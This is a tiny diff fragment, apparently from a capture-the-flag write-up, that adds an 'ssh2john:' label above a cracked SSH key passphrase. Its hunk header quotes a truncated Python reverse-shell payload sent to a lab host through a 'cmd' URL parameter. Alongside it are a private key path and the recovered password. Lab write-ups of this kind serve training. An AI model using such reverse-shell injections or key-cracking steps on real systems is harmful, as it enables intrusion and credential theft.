@@ -134,6 +134,7 @@ http://10.10.112.236:3000/?cmd=python -c 'import socket,subprocess,os;s=socket.s
 '''
 /home/jordan/.ssh/id_rsa
 
+ssh2john:
 pass123          (jordan_rsa)
 '''
 
